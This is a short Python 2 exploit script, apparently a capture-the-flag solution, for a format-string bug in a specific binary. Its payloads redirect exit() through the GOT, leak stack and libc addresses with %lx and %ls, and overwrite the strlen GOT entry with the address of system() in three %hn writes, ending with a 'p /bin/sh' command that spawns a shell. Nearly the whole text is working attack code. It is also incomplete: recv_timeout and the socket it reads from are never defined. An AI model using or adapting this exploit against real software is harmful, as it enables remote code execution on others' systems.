import struct
import time

EXIT_PLT = 0x601258
STRLEN_PLT = 0x601210
PRINTF_PLT = 0x601220
SYSTEM_OFFSET = 0x3f460

def pad(string, length):
  return string+"\x90"*(length-len(string))


#PAYLOD 1 - Redirects exit(), so it loops safely

exploit = pad("e ",8) #8 characters
exploit += "\x90"*8*5 #Padding to empty spaces

exploit += pad("%4196426x%22$n", 16) #Redirects to 0x400878
exploit += struct.pack("<Q",EXIT_PLT)

print exploit


#PAYLOAD 2 - Gets the address of a pointer arg*

#Value should be 0x7fffffffddb2 with ASLR OFF
#print "e %7$lx" #7th or 13th
address = "7fffffffddb2" #Test Value

exploit = pad("e ",8) #8 characters
exploit += "A"*8*7 #Padding to empty spaces
exploit += struct.pack("<Q",PRINTF_PLT)
print exploit

exploit = "e %22$ls\x90"
print exploit
data = recv_timeout(s)
data = data[data.index("\n"):data.index("\x90")]
base = ''
for i in data:
    base = hex(ord(i))[2:] + base
print base

#PAYLOAD 3 - Get base address
#print "e %1$lx" #Offset -0x399683
#print "e %2$lx" #Offset -0x39a760
#print "e %3$lx" #Offset -0xdb600

#PAYLOAD 4 - Set execve address

baseAddress = "7ffff7a3b000" #Test Value

#End
addr = int(baseAddress, 16)
addr += SYSTEM_OFFSET
address = hex(addr)
address = address[-4:]
addr = int(address, 16) - 47

exploit = pad("e ",8)
exploit += pad("%"+str(addr)+"x", 8*6)
exploit += pad("%22$hn",8)
exploit += struct.pack("<Q",STRLEN_PLT)

print exploit

#Middle
addr = int(baseAddress, 16)
addr += SYSTEM_OFFSET
address = hex(addr)
address = address[-8:-4]
addr = int(address, 16) - 47

exploit = pad("e ",8)
exploit += pad("%"+str(addr)+"x", 8*6)
exploit += pad("%22$hn",8)
exploit += struct.pack("<Q",STRLEN_PLT+2)

print exploit

#Front
addr = int(baseAddress, 16)
addr += SYSTEM_OFFSET
address = hex(addr)
address = address[-12:-8]
addr = int(address, 16) - 47

exploit = pad("e ",8)
exploit += pad("%"+str(addr)+"x", 8*6)
exploit += pad("%22$hn",8)
exploit += struct.pack("<Q",STRLEN_PLT+4)

print exploit

print "p /bin/sh"
